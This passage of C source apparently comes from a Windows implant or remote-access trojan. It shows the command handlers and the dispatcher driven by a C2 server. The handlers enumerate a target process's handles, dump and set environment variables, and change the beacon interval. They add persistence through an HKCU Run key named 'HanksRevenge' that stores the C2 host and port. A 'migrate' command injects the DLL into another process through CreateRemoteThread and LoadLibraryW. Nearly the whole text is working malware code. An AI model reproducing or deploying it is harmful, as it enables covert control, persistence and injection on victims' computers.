        if (modules[i].name) ImplantHeapFree(modules[i].name);
        if (modules[i].path) ImplantHeapFree(modules[i].path);
    }
    ImplantHeapFree(modules);

    *(DWORD*)buf = actualCount;
    *responseData = buf;
    *responseLen  = offset;
    return NO_ERROR;
}

/*
 * CmdHandlelist — enumerate handles belonging to a process via
 * NtQuerySystemInformation(SystemHandleInformation).
 *
 * Response: DWORD  count
 *           for each handle:
 *             DWORD handle_value
 *             DWORD object_type_index
 *             DWORD granted_access
 */
DWORD CmdHandlelist(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD        targetPid;
    HMODULE      ntdll;
    PFN_NtQSI    pNtQSI;
    ULONG        bufSize  = 256U * 1024U;
    SHANDLE_INFO* pSHI    = NULL;
    LONG         ntStatus;
    ULONG        returnLen = 0;
    ULONG        i;
    DWORD        count;
    DWORD        respLen;
    PBYTE        resp;
    PBYTE        off;

    if (dataLen < sizeof(DWORD) || !data) return ERROR_INVALID_REQUEST;
    targetPid = *(DWORD*)data;

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return GetLastError();

    pNtQSI = (PFN_NtQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQSI) return GetLastError();

    /* Grow the buffer until NtQSI is satisfied. */
    do {
        if (pSHI) ImplantHeapFree(pSHI);
        pSHI = (SHANDLE_INFO*)ImplantHeapAlloc(bufSize);
        if (!pSHI) return ERROR_MEMORY_ALLOCATION_FAILED;
        ntStatus = pNtQSI(MY_SYS_HANDLE_INFO_CLASS, pSHI, bufSize, &returnLen);
        bufSize *= 2U;
    } while (ntStatus == MY_STATUS_INFO_MISMATCH);

    if (ntStatus != 0L)
    {
        ImplantHeapFree(pSHI);
        return (DWORD)ntStatus;
    }

    /* Count matching handles. */
    count = 0;
    for (i = 0; i < pSHI->EntryCount; i++)
    {
        if ((DWORD)pSHI->Entries[i].OwnerPid == targetPid) count++;
    }

    respLen = sizeof(DWORD) + count * (sizeof(DWORD) * 3U);
    resp    = (PBYTE)ImplantHeapAlloc(respLen);
    if (!resp) { ImplantHeapFree(pSHI); return ERROR_MEMORY_ALLOCATION_FAILED; }

    off = resp;
    *(DWORD*)off = count; off += sizeof(DWORD);

    for (i = 0; i < pSHI->EntryCount; i++)
    {
        if ((DWORD)pSHI->Entries[i].OwnerPid != targetPid) continue;
        *(DWORD*)off = (DWORD)pSHI->Entries[i].HandleValue;    off += sizeof(DWORD);
        *(DWORD*)off = (DWORD)pSHI->Entries[i].ObjectTypeIdx;  off += sizeof(DWORD);
        *(DWORD*)off = (DWORD)pSHI->Entries[i].GrantedAccess;  off += sizeof(DWORD);
    }

    ImplantHeapFree(pSHI);
    *responseData = resp;
    *responseLen  = respLen;
    return NO_ERROR;
}

/* ===========================================================================
 * ENVIRONMENT COMMANDS
 * ========================================================================= */

/*
 * CmdEnv — return the full environment block as a double-null-terminated
 * sequence of UTF-16LE "NAME=VALUE\0" strings.
 */
DWORD CmdEnv(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR envBlock;
    PWSTR p;
    DWORD totalBytes;
    PBYTE resp;

    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);

    envBlock = GetEnvironmentStringsW();
    if (!envBlock) return GetLastError();

    /* Walk to the final null to compute total block size. */
    p = envBlock;
    while (*p) p += wcslen(p) + 1;
    totalBytes = (DWORD)((p - envBlock + 1U) * sizeof(WCHAR));

    resp = (PBYTE)ImplantHeapAlloc(totalBytes);
    if (!resp) { FreeEnvironmentStringsW(envBlock); return ERROR_MEMORY_ALLOCATION_FAILED; }

    CopyMemory(resp, envBlock, totalBytes);
    FreeEnvironmentStringsW(envBlock);

    *responseData = resp;
    *responseLen  = totalBytes;
    return NO_ERROR;
}

/*
 * CmdGetenv — return the value of one environment variable (UTF-16LE).
 */
DWORD CmdGetenv(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR name   = NULL;
    DWORD valLen;
    PWSTR value;
    DWORD status = NO_ERROR;

    status = ConvertUtf8ToWideString(dataLen, data, &name);
    if (status != NO_ERROR) return status;

    valLen = GetEnvironmentVariableW(name, NULL, 0);
    if (valLen == 0)
    {
        status = GetLastError();
        ImplantHeapFree(name);
        return status;
    }

    value = (PWSTR)ImplantHeapAlloc(valLen * sizeof(WCHAR));
    if (!value) { ImplantHeapFree(name); return ERROR_MEMORY_ALLOCATION_FAILED; }

    if (!GetEnvironmentVariableW(name, value, valLen))
    {
        status = GetLastError();
        ImplantHeapFree(value);
        ImplantHeapFree(name);
        return status;
    }

    ImplantHeapFree(name);
    *responseData = (PBYTE)value;
    *responseLen  = valLen * sizeof(WCHAR);
    return NO_ERROR;
}

/*
 * CmdSetenv — create or update an environment variable.
 *
 * Argument: UTF-8 "NAME=VALUE"
 */
DWORD CmdSetenv(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR pair = NULL;
    PWSTR eq;
    DWORD status = NO_ERROR;

    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    status = ConvertUtf8ToWideString(dataLen, data, &pair);
    if (status != NO_ERROR) return status;

    eq = wcschr(pair, L'=');
    if (!eq)
    {
        ImplantHeapFree(pair);
        return ERROR_INVALID_REQUEST;
    }

    *eq = L'\0';   /* split into name (pair) and value (eq+1) */

    if (!SetEnvironmentVariableW(pair, eq + 1))
        status = GetLastError();

    ImplantHeapFree(pair);
    return status;
}

/* ===========================================================================
 * IMPLANT MANAGEMENT COMMANDS
 * ========================================================================= */

/*
 * CmdSleep — change the beacon poll interval.
 *
 * Argument: DWORD milliseconds
 */
DWORD CmdSleep(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    if (dataLen < sizeof(DWORD) || !data) return ERROR_INVALID_REQUEST;

    SetPollInterval(*(DWORD*)data);
    return NO_ERROR;
}

/*
 * CmdKill — schedule graceful implant shutdown after this result is posted.
 */
DWORD CmdKill(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);
    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    SetKillPending();
    return NO_ERROR;
}

/*
 * CmdPersist — install a HKCU Run registry key so the implant restarts
 * automatically when the user logs in.
 *
 * Registry value name : HanksRevenge
 * Registry value data : "<host_exe>" "<dll_path>" <host> <port>
 */
DWORD CmdPersist(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    WCHAR   exePath[MAX_PATH];
    WCHAR   hostBuf[64];
    WCHAR   portBuf[16];
    WCHAR   value[MAX_PATH * 2 + 128];
    PCWSTR  dllPath;
    HKEY    hKey;
    DWORD   status = NO_ERROR;

    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);
    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
        return GetLastError();

    dllPath = GetImplantDllPath();
    if (!dllPath || dllPath[0] == L'\0')
        return ERROR_INVALID_REQUEST;

    GetC2Config(hostBuf, ARRAYSIZE(hostBuf), portBuf, ARRAYSIZE(portBuf));

    /* Format: "exe_path" "dll_path" host port */
    if (_snwprintf_s(value, ARRAYSIZE(value), _TRUNCATE,
                     L"\"%ls\" \"%ls\" %ls %ls",
                     exePath, dllPath, hostBuf, portBuf) < 0)
    {
        return ERROR_MEMORY_ALLOCATION_FAILED;
    }

    status = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (status != ERROR_SUCCESS) return status;

    status = RegSetValueExW(hKey, L"HanksRevenge", 0, REG_SZ,
                            (CONST BYTE*)value,
                            (DWORD)((wcslen(value) + 1U) * sizeof(WCHAR)));
    RegCloseKey(hKey);
    return status;
}

/*
 * CmdUnpersist — remove the HKCU Run registry value added by persist.
 */
DWORD CmdUnpersist(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    HKEY  hKey;
    DWORD status;

    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);
    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    status = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    if (status != ERROR_SUCCESS) return status;

    status = RegDeleteValueW(hKey, L"HanksRevenge");
    RegCloseKey(hKey);
    return status;
}

/*
 * CmdMigrate — inject this DLL into another process using CreateRemoteThread
 * + LoadLibraryW so the implant continues running inside the target.
 *
 * Argument: DWORD target_pid
 */
DWORD CmdMigrate(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD   targetPid;
    PCWSTR  dllPath;
    SIZE_T  dllPathBytes;
    HANDLE  hProcess     = NULL;
    LPVOID  remoteBuf    = NULL;
    SIZE_T  written;
    HANDLE  hThread      = NULL;
    FARPROC pLoadLib;
    LPTHREAD_START_ROUTINE entry;
    DWORD   status       = NO_ERROR;

    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    if (dataLen < sizeof(DWORD) || !data) return ERROR_INVALID_REQUEST;
    targetPid = *(DWORD*)data;

    dllPath = GetImplantDllPath();
    if (!dllPath || dllPath[0] == L'\0') return ERROR_INVALID_REQUEST;

    dllPathBytes = (wcslen(dllPath) + 1U) * sizeof(WCHAR);

    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, targetPid);
    if (!hProcess) return GetLastError();

    remoteBuf = VirtualAllocEx(hProcess, NULL, dllPathBytes,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteBuf == NULL)
    {
        status = GetLastError();
        CloseHandle(hProcess);
        return status;
    }

    if (!WriteProcessMemory(hProcess, remoteBuf, dllPath, dllPathBytes, &written))
    {
        status = GetLastError();
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return status;
    }
    //change ddll
    pLoadLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!pLoadLib)
    {
        status = GetLastError();
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return status;
    }

#pragma warning(push)
#pragma warning(disable: 4055)
    entry = (LPTHREAD_START_ROUTINE)pLoadLib;
#pragma warning(pop)

    hThread = CreateRemoteThread(hProcess, NULL, 0, entry, remoteBuf, 0, NULL);
    if (!hThread)
    {
        status = GetLastError();
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
    }
    else
    {
        /* Wait briefly for the DLL to load, then clean up. */
        WaitForSingleObject(hThread, 5000);
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
    return status;
}

/* ===========================================================================
 * COMMAND DISPATCHER
 * ========================================================================= */

DWORD ExecuteCommandById(
    DWORD cmdId,
    DWORD dataLen,
    CONST PBYTE data,
    PBYTE* responseData,
    DWORD* responseLen)
{
    DWORD i;

    ASSERT(responseData != NULL);
    ASSERT(responseLen  != NULL);

    *responseData = NULL;
    *responseLen  = 0;

    for (i = 0; i < ARRAYSIZE(G_CommandTable); i++)
    {
        if ((DWORD)G_CommandTable[i].id == cmdId)
        {
            return G_CommandTable[i].handler(
                dataLen, data, responseData, responseLen);
        }
    }

    return ERROR_UNKNOWN_COMMAND;
}
